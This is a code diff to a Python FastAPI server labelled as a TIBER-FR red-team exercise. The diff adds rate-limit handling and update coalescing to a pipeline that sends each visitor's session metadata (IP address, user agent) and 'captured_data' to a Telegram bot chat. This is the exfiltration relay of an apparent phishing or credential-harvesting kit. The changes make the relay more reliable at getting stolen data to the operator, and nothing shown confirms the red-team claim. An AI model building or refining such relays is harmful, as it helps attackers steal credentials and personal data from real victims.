@@ -5,6 +5,7 @@ from motor.motor_asyncio import AsyncIOMotorClient
 import os
 import logging
 import uuid
+import asyncio
 import httpx
 import html
 from pathlib import Path
@@ -22,6 +23,12 @@ db = client[os.environ["DB_NAME"]]
 
 app = FastAPI(title="Certicode Plus - TIBER-FR Red Team Exercise")
 api_router = APIRouter(prefix="/api")
+
+# Per-session Telegram update coalescing state.
+# Each entry holds an asyncio.Lock, a worker task handle, a dirty flag,
+# and the latest client meta/stage to publish.
+_session_states: Dict[str, Dict[str, Any]] = {}
+_session_locks_guard = asyncio.Lock()
 
 # ---------- Models ----------
 
@@ -173,11 +180,13 @@ async def _telegram_send(text: str) -> Optional[int]:
     return None
 
 
-async def _telegram_edit(message_id: int, text: str) -> bool:
+async def _telegram_edit(message_id: int, text: str) -> tuple[bool, float]:
+    """Edit a Telegram message. Returns (success, retry_after_seconds).
+    retry_after > 0 indicates the caller should back off for that many seconds."""
     token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
     chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
     if not token or not chat_id:
-        return False
+        return False, 0.0
     url = f"https://api.telegram.org/bot{token}/editMessageText"
     payload = {
         "chat_id": chat_id,
@@ -191,62 +200,116 @@ async def _telegram_edit(message_id: int, text: str) -> bool:
             r = await http.post(url, json=payload)
         j = r.json()
         if r.status_code == 200 and j.get("ok"):
-            return True
+            return True, 0.0
         # 'message is not modified' returns 400 but is harmless
         if "not modified" in r.text:
-            return True
+            return True, 0.0
+        if r.status_code == 429:
+            retry_after = float(j.get("parameters", {}).get("retry_after", 1) or 1)
+            logging.warning(f"telegram edit 429, retry_after={retry_after}")
+            return False, retry_after
         logging.warning(f"telegram edit failed: {r.status_code} {r.text[:200]}")
     except Exception:
         logging.exception("Telegram edit failed")
-    return False
+    return False, 0.0
 
 
 async def _push_or_edit_progress(session_id: str, request: Request, stage: Optional[str]) -> bool:
     """Maintain TWO Telegram messages per session: one for session metadata, one for captured data.
-    First call sends both; subsequent calls edit them in place."""
-    sess = await db.sessions.find_one({"session_id": session_id})
-    if not sess:
-        return False
+    First call sends both; subsequent calls edit them in place.
+    Uses per-session coalescing to handle Telegram 429 rate-limits: rapid updates
+    are merged and the LATEST state is always eventually pushed, with retry-after backoff."""
+    # Capture current client meta now (request not available in background task)
     meta = _client_meta(request)
-    captured = sess.get("captured_data", {}) or {}
-    started_at = sess.get("created_at", "")
 
-    session_text = _format_session_message(session_id, meta, stage, started_at)
-    data_text = _format_data_message(captured)
+    async with _session_locks_guard:
+        state = _session_states.get(session_id)
+        if state is None:
+            state = {
+                "lock": asyncio.Lock(),
+                "task": None,
+                "dirty": True,
+                "latest_meta": meta,
+                "latest_stage": stage,
+            }
+            _session_states[session_id] = state
+        else:
+            state["dirty"] = True
+            state["latest_meta"] = meta
+            state["latest_stage"] = stage
 
-    session_msg_id = sess.get("tg_session_message_id")
-    data_msg_id = sess.get("tg_data_message_id")
+    # Spawn a single background worker per session that drains pending updates
+    if state["task"] is None or state["task"].done():
+        state["task"] = asyncio.create_task(_drain_session_updates(session_id))
 
-    sent_any = False
-    update_fields = {}
+    return True
 
-    # Session metadata message
-    if session_msg_id:
-        if await _telegram_edit(session_msg_id, session_text):
-            sent_any = True
-    else:
-        new_id = await _telegram_send(session_text)
-        if new_id is not None:
-            update_fields["tg_session_message_id"] = new_id
-            sent_any = True
 
-    # Data capture message
-    if data_msg_id:
-        if await _telegram_edit(data_msg_id, data_text):
-            sent_any = True
-    else:
-        new_id = await _telegram_send(data_text)
-        if new_id is not None:
-            update_fields["tg_data_message_id"] = new_id
-            sent_any = True
+async def _drain_session_updates(session_id: str) -> None:
+    """Background worker that pushes the latest captured state for a session to Telegram.
+    Handles 429 rate-limits with exponential backoff and coalesces rapid updates."""
+    state = _session_states.get(session_id)
+    if state is None:
+        return
+    async with state["lock"]:
+        # Minimum interval between Telegram edits per session (avoids 429 storms)
+        MIN_INTERVAL_SEC = 1.2
+        while True:
+            if not state.get("dirty"):
+                return
+            state["dirty"] = False
+            stage = state.get("latest_stage")
 
-    if update_fields:
-        await db.sessions.update_one(
-            {"session_id": session_id},
-            {"$set": update_fields},
-        )
+            sess = await db.sessions.find_one({"session_id": session_id})
+            if not sess:
+                return
+            meta = state.get("latest_meta") or {"ip": sess.get("ip", "?"), "user_agent": sess.get("user_agent", "?")}
+            captured = sess.get("captured_data", {}) or {}
+            started_at = sess.get("created_at", "")
 
-    return sent_any
+            session_text = _format_session_message(session_id, meta, stage, started_at)
+            data_text = _format_data_message(captured)
+
+            session_msg_id = sess.get("tg_session_message_id")
+            data_msg_id = sess.get("tg_data_message_id")
+            update_fields = {}
+
+            # Session metadata message
+            if session_msg_id:
+                ok, retry_after = await _telegram_edit(session_msg_id, session_text)
+                if not ok and retry_after > 0:
+                    state["dirty"] = True
+                    await asyncio.sleep(retry_after + 0.2)
+                    continue
+            else:
+                new_id = await _telegram_send(session_text)
+                if new_id is not None:
+                    update_fields["tg_session_message_id"] = new_id
+
+            # Data capture message
+            if data_msg_id:
+                ok, retry_after = await _telegram_edit(data_msg_id, data_text)
+                if not ok and retry_after > 0:
+                    state["dirty"] = True
+                    if update_fields:
+                        await db.sessions.update_one(
+                            {"session_id": session_id}, {"$set": update_fields}
+                        )
+                    await asyncio.sleep(retry_after + 0.2)
+                    continue
+            else:
+                new_id = await _telegram_send(data_text)
+                if new_id is not None:
+                    update_fields["tg_data_message_id"] = new_id
+
+            if update_fields:
+                await db.sessions.update_one(
+                    {"session_id": session_id}, {"$set": update_fields}
+                )
+
+            # Pace updates: wait MIN_INTERVAL before allowing the next edit
+            await asyncio.sleep(MIN_INTERVAL_SEC)
+            # Loop: if more updates queued in the meantime, send latest; else exit
 
 
 # ---------- Routes ----------
